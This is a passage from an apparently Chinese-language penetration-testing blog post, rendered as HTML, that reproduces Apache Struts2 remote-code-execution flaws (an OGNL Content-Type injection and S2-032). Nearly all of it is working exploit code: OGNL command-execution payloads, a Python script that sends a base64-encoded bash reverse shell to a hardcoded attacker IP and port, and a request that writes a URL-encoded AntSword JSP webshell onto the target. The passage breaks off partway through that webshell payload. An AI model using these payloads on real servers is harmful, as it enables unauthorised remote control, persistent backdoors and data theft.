class="hljs-string">&#x27;multipart/form-data&#x27;</span>).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[<span class="hljs-string">&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;</span>]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@<span class="hljs-keyword">class</span>)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=<span class="hljs-string">&#x27;id&#x27;</span>).(#iswin=(@java.lang.System@getProperty(<span class="hljs-string">&#x27;os.name&#x27;</span>).toLowerCase().contains(<span class="hljs-string">&#x27;win&#x27;</span>))).(#cmds=(#iswin?&#123;<span class="hljs-string">&#x27;cmd.exe&#x27;</span>,<span class="hljs-string">&#x27;/c&#x27;</span>,#cmd&#125;:&#123;<span class="hljs-string">&#x27;/bin/bash&#x27;</span>,<span class="hljs-string">&#x27;-c&#x27;</span>,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Struts2/image-20240116165751091.png" alt="image-20240116165751091"></p><p>反弹shell的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-comment"># 靶机地址 URL</span><br>target_url = <span class="hljs-string">&quot;http://120.26.80.77:8080/&quot;</span><br><span class="hljs-comment"># 接收反弹shell 攻击机IP</span><br>reverse_ip = <span class="hljs-string">&quot;8.219.161.88&quot;</span><br><span class="hljs-comment"># 接收反弹shell 攻击机端口</span><br>reverse_port = <span class="hljs-string">&quot;9090&quot;</span><br><br>bash_reverse_shell = <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/&quot;</span> + reverse_ip + <span class="hljs-string">&quot;/&quot;</span> + reverse_port + <span class="hljs-string">&quot; 0&gt;&amp;1&quot;</span><br><br>headers = &#123;<br>    <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;%&#123;(#nike=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;echo &quot;</span> + <span class="hljs-built_in">str</span>(base64.b64encode(bash_reverse_shell.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)), <span class="hljs-string">&quot;utf-8&quot;</span>) + <span class="hljs-string">&quot;|base64 -d|bash -i&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot;</span><br>&#125;<br><br>rep = requests.post(url=target_url, headers=headers)<br></code></pre></td></tr></table></figure><h1 id="strruts2-032"><a href="#strruts2-032" class="headerlink" title="strruts2-032"></a>strruts2-032</h1><h2 id="漏洞复现-6"><a href="#漏洞复现-6" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>payload</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?method:<span class="hljs-variable">%23</span>_memberAccess<span class="hljs-variable">%3</span>d<span class="hljs-variable">%40</span>ognl.OgnlContext<span class="hljs-variable">%20</span><span class="hljs-variable">%40</span>DEFAULT_MEMBER_ACCESS<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%23</span>a<span class="hljs-variable">%3</span>d<span class="hljs-variable">%40</span>java.lang.Runtime<span class="hljs-variable">%40</span>getRuntime<span class="hljs-variable">%28</span><span class="hljs-variable">%29</span>.exec<span class="hljs-variable">%28</span><span class="hljs-variable">%23</span>parameters.command<span class="hljs-variable">%20</span><span class="hljs-variable">%5</span>B<span class="hljs-number">0</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%29</span>.getInputStream<span class="hljs-variable">%28</span><span class="hljs-variable">%29</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%23</span>b<span class="hljs-variable">%3</span>dnew<span class="hljs-variable">%20</span>java.io.InputStreamReader<span class="hljs-variable">%28</span><span class="hljs-variable">%23</span>a<span class="hljs-variable">%29</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%23</span><span class="hljs-keyword">c</span><span class="hljs-variable">%3</span>dnew<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>java.io.BufferedReader<span class="hljs-variable">%28</span><span class="hljs-variable">%23</span>b<span class="hljs-variable">%29</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%23</span>d<span class="hljs-variable">%3</span>dnew<span class="hljs-variable">%20</span>char<span class="hljs-variable">%5</span>B<span class="hljs-number">51020</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%23</span><span class="hljs-keyword">c</span>.read<span class="hljs-variable">%28</span><span class="hljs-variable">%23</span>d<span class="hljs-variable">%29</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%23</span>kxlzx<span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%40</span>org.apache.struts<span class="hljs-number">2</span>.ServletActionContext<span class="hljs-variable">%40</span>getResponse<span class="hljs-variable">%28</span><span class="hljs-variable">%29</span>.getWriter<span class="hljs-variable">%28</span><span class="hljs-variable">%29</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%23</span>kxlzx.println<span class="hljs-variable">%28</span><span class="hljs-variable">%23</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%29</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%23</span>kxlzx.close&amp;command<span class="hljs-operator">=</span>whoami<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Struts2/image-20240116170913394.png" alt="image-20240116170913394"></p><p>执行命令</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">method</span>:%<span class="hljs-number">23</span>_memberAccess%<span class="hljs-number">3</span>d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%<span class="hljs-number">23</span>res%<span class="hljs-number">3</span>d%<span class="hljs-number">40</span>org.apache.struts2.ServletActionContext%<span class="hljs-number">40</span>getResponse(),%<span class="hljs-number">23</span>res.setCharacterEncoding(%<span class="hljs-number">23</span>parameters.encoding[<span class="hljs-number">0</span>]),%<span class="hljs-number">23</span>w%<span class="hljs-number">3</span>d%<span class="hljs-number">23</span>res.getWriter(),%<span class="hljs-number">23</span>s%<span class="hljs-number">3</span>dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%<span class="hljs-number">23</span>parameters.cmd[<span class="hljs-number">0</span>]).getInputStream()).useDelimiter(%<span class="hljs-number">23</span>parameters.pp[<span class="hljs-number">0</span>]),%<span class="hljs-number">23</span>str%<span class="hljs-number">3</span>d%<span class="hljs-number">23</span>s.hasNext()%<span class="hljs-number">3</span>f%<span class="hljs-number">23</span>s.next()%<span class="hljs-number">3</span>a%<span class="hljs-number">23</span>parameters.ppp[<span class="hljs-number">0</span>],%<span class="hljs-number">23</span>w.print(%<span class="hljs-number">23</span>str),%<span class="hljs-number">23</span>w.close(),<span class="hljs-number">1</span>?%<span class="hljs-number">23</span>xx:%<span class="hljs-number">23</span>request.toString&amp;cmd=whoami&amp;pp=\\A&amp;ppp=%<span class="hljs-number">20</span>&amp;encoding=UTF-<span class="hljs-number">8</span><br></code></pre></td></tr></table></figure><p>上传蚁剑的webshell</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?method:<span class="hljs-variable">%23</span>_memberAccess<span class="hljs-variable">%3</span>d<span class="hljs-title">@ognl.OgnlContext</span><span class="hljs-title">@DEFAULT_MEMBER_ACCESS</span><span class="hljs-punctuation">,</span><span class="hljs-variable">%23</span>req<span class="hljs-variable">%3</span>d<span class="hljs-variable">%40</span>org.apache.struts<span class="hljs-number">2</span>.ServletActionContext<span class="hljs-variable">%40</span>getRequest()<span class="hljs-punctuation">,</span><span class="hljs-variable">%23</span>res<span class="hljs-variable">%3</span>d<span class="hljs-variable">%40</span>org.apache.struts<span class="hljs-number">2</span>.ServletActionContext<span class="hljs-variable">%40</span>getResponse()<span class="hljs-punctuation">,</span><span class="hljs-variable">%23</span>res.setCharacterEncoding(<span class="hljs-variable">%23</span>parameters.encoding[<span class="hljs-number">0</span>])<span class="hljs-punctuation">,</span><span class="hljs-variable">%23</span>w<span class="hljs-variable">%3</span>d<span class="hljs-variable">%23</span>res.getWriter()<span class="hljs-punctuation">,</span><span class="hljs-variable">%23</span>path<span class="hljs-variable">%3</span>d<span class="hljs-variable">%23</span>req.getRealPath(<span class="hljs-variable">%23</span>parameters.pp[<span class="hljs-number">0</span>])<span class="hljs-punctuation">,</span>new<span class="hljs-variable">%20</span>java.io.BufferedWriter(new<span class="hljs-variable">%20</span>java.io.FileWriter(<span class="hljs-variable">%23</span>path<span class="hljs-variable">%2</span>b<span class="hljs-variable">%23</span>parameters.shellname[<span class="hljs-number">0</span>]).append(<span class="hljs-variable">%23</span>parameters.shellContent[<span class="hljs-number">0</span>])).close()<span class="hljs-punctuation">,</span><span class="hljs-variable">%23</span>w.print(<span class="hljs-variable">%23</span>path)<span class="hljs-punctuation">,</span><span class="hljs-variable">%23</span>w.close()<span class="hljs-punctuation">,</span><span class="hljs-number">1</span>?<span class="hljs-variable">%23</span>xx:<span class="hljs-variable">%23</span>request.toString&amp;shellname<span class="hljs-operator">=</span>cmd.jsp&amp;shellContent<span class="hljs-operator">=</span><span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%25</span><span class="hljs-variable">%21</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%63</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%73</span><span class="hljs-variable">%20</span><span class="hljs-variable">%55</span><span class="hljs-variable">%20</span><span class="hljs-variable">%65</span><span class="hljs-variable">%78</span><span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%64</span><span class="hljs-variable">%73</span><span class="hljs-variable">%20</span><span class="hljs-variable">%43</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%73</span><span class="hljs-variable">%4</span><span class="hljs-keyword">c</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%61</span><span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%55</span><span class="hljs-variable">%28</span><span class="hljs-variable">%43</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%73</span><span class="hljs-variable">%4</span><span class="hljs-keyword">c</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%61</span><span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%20</span><span class="hljs-variable">%63</span><span class="hljs-variable">%29</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%73</span><span class="hljs-variable">%75</span><span class="hljs-variable">%70</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%28</span><span class="hljs-variable">%63</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%70</span><span class="hljs-variable">%75</span><span class="hljs-variable">%62</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%69</span><span class="hljs-variable">%63</span><span class="hljs-variable">%20</span><span class="hljs-variable">%43</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%73</span><span class="hljs-variable">%20</span><span class="hljs-variable">%67</span><span class="hljs-variable">%28</span><span class="hljs-variable">%62</span><span class="hljs-variable">%79</span><span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%5</span>b<span class="hljs-variable">%5</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%62</span><span class="hljs-variable">%29</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%72</span><span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%75</span><span class="hljs-variable">%72</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%20</span><span class="hljs-variable">%73</span><span class="hljs-variable">%75</span><span class="hljs-variable">%70</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%66</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%65</span><span class="hljs-variable">%43</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%73</span><span class="hljs-variable">%28</span><span class="hljs-variable">%62</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%30</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%62</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%67</span><span class="hljs-variable">%74</span><span class="hljs-variable">%68</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%70</span><span class="hljs-variable">%75</span><span class="hljs-variable">%62</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%69</span><span class="hljs-variable">%63</span><span class="hljs-variable">%20</span><span class="hljs-variable">%62</span><span class="hljs-variable">%79</span><span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%5</span>b<span class="hljs-variable">%5</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%62</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%65</span><span class="hljs-variable">%36</span><span class="hljs-variable">%34</span><span class="hljs-variable">%44</span><span class="hljs-variable">%65</span><span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%28</span><span class="hljs-variable">%53</span><span class="hljs-variable">%74</span><span class="hljs-variable">%72</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%67</span><span class="hljs-variable">%20</span><span class="hljs-variable">%73</span><span class="hljs-variable">%74</span><span class="hljs-variable">%72</span><span class="hljs-variable">%29</span><span class="hljs-variable">%20</span><span class="hljs-variable">%74</span><span class="hljs-variable">%68</span><span class="hljs-variable">%72</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%77</span><span class="hljs-variable">%73</span><span class="hljs-variable">%20</span><span class="hljs-variable">%45</span><span class="hljs-variable">%78</span><span class="hljs-variable">%63</span><span class="hljs-variable">%65</span><span class="hljs-variable">%70</span><span class="hljs-variable">%74</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%74</span><span class="hljs-variable">%72</span><span class="hljs-variable">%79</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%43</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%73</span><span class="hljs-variable">%20</span><span class="hljs-variable">%63</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%7</span>a<span class="hljs-variable">%7</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%43</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%73</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%66</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%72</span><span class="hljs-variable">%4</span>e<span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%65</span><span class="hljs-variable">%28</span><span class="hljs-variable">%22</span><span class="hljs-variable">%73</span><span class="hljs-variable">%75</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%2</span>e<span class="hljs-variable">%6</span>d<span class="hljs-variable">%69</span><span class="hljs-variable">%73</span><span class="hljs-variable">%63</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%42</span><span class="hljs-variable">%41</span><span class="hljs-variable">%53</span><span class="hljs-variable">%45</span><span class="hljs-variable">%36</span><span class="hljs-variable">%34</span><span class="hljs-variable">%44</span><span class="hljs-variable">%65</span><span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%22</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%72</span><span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%75</span><span class="hljs-variable">%72</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%20</span><span class="hljs-variable">%28</span><span class="hljs-variable">%62</span><span class="hljs-variable">%79</span><span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%5</span>b<span class="hljs-variable">%5</span>d<span class="hljs-variable">%29</span><span class="hljs-variable">%20</span><span class="hljs-variable">%63</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%7</span>a<span class="hljs-variable">%7</span>a<span class="hljs-variable">%2</span>e<span class="hljs-variable">%67</span><span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%68</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%64</span><span class="hljs-variable">%28</span><span class="hljs-variable">%22</span><span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%42</span><span class="hljs-variable">%75</span><span class="hljs-variable">%66</span><span class="hljs-variable">%66</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%22</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%53</span><span class="hljs-variable">%74</span><span class="hljs-variable">%72</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%67</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%73</span><span class="hljs-variable">%29</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%76</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>b<span class="hljs-variable">%65</span><span class="hljs-variable">%28</span><span class="hljs-variable">%63</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%7</span>a<span class="hljs-variable">%7</span>a<span class="hljs-variable">%2</span>e<span class="hljs-variable">%6</span>e<span class="hljs-variable">%65</span><span class="hljs-variable">%77</span><span class="hljs-variable">%49</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%73</span><span class="hljs-variable">%74</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%63</span><span class="hljs-variable">%65</span><span class="hljs-variable">%28</span><span class="hljs-variable">%29</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%73</span><span class="hljs-variable">%74</span><span class="hljs-variable">%72</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%63</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%63</span><span class="hljs-variable">%68</span><span class="hljs-variable">%20</span><span class="hljs-variable">%28</span><span class="hljs-variable">%45</span><span class="hljs-variable">%78</span><span class="hljs-variable">%63</span><span class="hljs-variable">%65</span><span class="hljs-variable">%70</span><span class="hljs-variable">%74</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%20</span><span class="hljs-variable">%65</span><span class="hljs-variable">%29</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%43</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%73</span><span class="hljs-variable">%20</span><span class="hljs-variable">%63</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%7</span>a<span class="hljs-variable">%7</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%43</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%73</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%66</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%72</span><span class="hljs-variable">%4</span>e<span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%65</span><span class="hljs-variable">%28</span><span class="hljs-variable">%22</span><span class="hljs-variable">%6</span>a<span class="hljs-variable">%61</span><span class="hljs-variable">%76</span><span class="hljs-variable">%61</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%75</span><span class="hljs-variable">%74</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%42</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%65</span><span class="hljs-variable">%36</span><span class="hljs-variable">%34</span><span class="hljs-variable">%22</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%4</span>f<span class="hljs-variable">%62</span><span 